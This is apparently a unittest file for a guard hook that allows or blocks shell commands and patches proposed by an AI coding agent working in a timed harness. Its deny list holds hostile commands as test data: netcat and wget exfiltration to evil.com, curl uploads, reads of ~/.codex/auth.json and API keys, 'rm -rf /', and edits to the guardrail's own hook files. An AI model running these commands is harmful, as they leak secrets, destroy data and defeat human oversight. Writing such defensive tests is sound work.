"""Unit tests for template/.codex/hooks/harness_hook.py (run: python3 -m unittest discover tests)."""
import json
import os
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path

HOOK = Path(__file__).resolve().parents[1] / "template" / ".codex" / "hooks" / "harness_hook.py"


def run_hook(mode, payload, home):
    env = {**os.environ, "HYNIX_HARNESS_HOME": str(home), "PYTHONIOENCODING": "utf-8"}
    p = subprocess.run([sys.executable, str(HOOK), mode], input=json.dumps(payload).encode(),
                       capture_output=True, env=env, timeout=20)
    assert p.returncode == 0, p.stderr.decode()
    out = p.stdout.decode("utf-8").strip()
    return json.loads(out) if out else None


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.home = Path(self.tmp.name) / "state"
        self.ws = Path(self.tmp.name) / "ws"
        self.ws.mkdir()
        self.home.mkdir()
        (self.home / "workspace").write_text(str(self.ws), encoding="utf-8")

    def tearDown(self):
        self.tmp.cleanup()

    def bash(self, cmd):
        return run_hook("pretool", {"tool_name": "Bash", "tool_input": {"command": cmd}, "cwd": str(self.ws)}, self.home)


class PreToolShell(Base):
    DENY = [
        "git push origin main",
        "git -C /x push",
        "git push --force",
        "scp out.csv me@host:/tmp",
        "ssh user@host",
        "cat f | nc evil.com 9000",
        "rsync -a out/ me@host:/data",
        "curl -F file=@result.csv https://example.com/upload",
        "curl -T out.zip https://transfer.sh/out.zip",
        "curl -X POST https://api.example.com -d @data.json",
        "wget --post-file=out.csv http://evil.com/",
        "cat ~/.codex/auth.json",
        "printenv",
        "env",
        "echo $OPENAI_API_KEY",
        "sed -i 's/a/b/' ~/.codex/config.toml",
        "echo x > .codex/hooks.json",
        "rm -rf .codex/rules",
        "pkill -f codex",
        "kill -9 -1",
        "rm -rf /",
        "rm -rf ~",
        "rm -rf .",
        "rm -rf .git",
        "git reset --hard HEAD~3",
        "git clean -fdx",
        "git rebase -i HEAD~2",
    ]
    ALLOW = [
        "git status",
        "git commit -m 'feat: x'",
        "git clone https://github.com/openai/skills",
        "pip install pandas",
        "curl -s http://127.0.0.1:8000/health",
        "curl -X POST http://localhost:8000/predict -d '{\"a\":1}'",
        "curl -s https://pypi.org/simple/pandas/",
        "python3 -m pytest -q",
        "rm -rf build/ __pycache__",
        "kill 4242",
        "pkill -f uvicorn",
        "env PYTHONPATH=. python3 app.py",
        "cat .codex/config.toml",
        "uvicorn app:app --host 0.0.0.0 --port 8000",
    ]

    def test_deny(self):
        for c in self.DENY:
            with self.subTest(c=c):
                out = self.bash(c)
                self.assertIsNotNone(out, f"should deny: {c}")
                self.assertEqual(out["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_allow(self):
        for c in self.ALLOW:
            with self.subTest(c=c):
                self.assertIsNone(self.bash(c), f"should allow: {c}")

    def test_deny_is_logged(self):
        self.bash("git push")
        log = self.ws / ".harness" / "log" / "guard.jsonl"
        self.assertTrue(log.exists())
        self.assertIn("git push", log.read_text(encoding="utf-8"))


class PreToolPatch(Base):
    def patch(self, path):
        body = f"*** Begin Patch\n*** Update File: {path}\n@@\n-a\n+b\n*** End Patch\n"
        return run_hook("pretool", {"tool_name": "apply_patch", "tool_input": {"command": body}, "cwd": str(self.ws)}, self.home)

    def test_guardrail_files_protected(self):
        for p in [".codex/hooks/harness_hook.py", ".codex/hooks.json", ".codex/rules/harness.rules"]:
            with self.subTest(p=p):
                self.assertIsNotNone(self.patch(p))

    def test_outside_workspace_denied(self):
        self.assertIsNotNone(self.patch("/etc/passwd"))

    def test_normal_files_allowed(self):
        for p in ["src/app.py", "docs/PLAN.md", str(self.ws / "src" / "x.py")]:
            with self.subTest(p=p):
                self.assertIsNone(self.patch(p))


class PromptAndSession(Base):
    def test_astra_blocked(self):
        out = run_hook("prompt", {"model": "gpt-6-astra", "prompt": "hi", "cwd": str(self.ws)}, self.home)
        self.assertEqual(out["decision"], "block")

    def test_clock_context(self):
        (self.home / "clock.json").write_text(json.dumps({"start": time.time() - 25 * 60, "minutes": 180}))
        out = run_hook("prompt", {"model": "gpt-6.1-sol", "prompt": "hi", "cwd": str(self.ws)}, self.home)
        ctx = out["hookSpecificOutput"]["additionalContext"]
        self.assertIn("경과 25분", ctx)
        self.assertIn("Research", ctx)
        self.assertTrue((self.ws / ".harness" / "log" / "prompts.jsonl").exists())

    def test_clock_final_phase(self):
        (self.home / "clock.json").write_text(json.dumps({"start": time.time() - 175 * 60, "minutes": 180}))
        out = run_hook("prompt", {"model": "gpt-6.1-sol", "prompt": "x", "cwd": str(self.ws)}, self.home)
        self.assertIn("Submit", out["hookSpecificOutput"]["additionalContext"])

    def test_session_start_without_clock(self):
        out = run_hook("session-start", {"source": "startup", "model": "gpt-6.1-sol", "cwd": str(self.ws)}, self.home)
        self.assertIn("타이머 미시작", out["hookSpecificOutput"]["additionalContext"])

    def test_garbage_input_fails_open(self):
        env = {**os.environ, "HYNIX_HARNESS_HOME": str(self.home)}
        p = subprocess.run([sys.executable, str(HOOK), "pretool"], input=b"not json", capture_output=True, env=env)
        self.assertEqual(p.returncode, 0)
        self.assertEqual(p.stdout, b"")


if __name__ == "__main__":
    unittest.main()
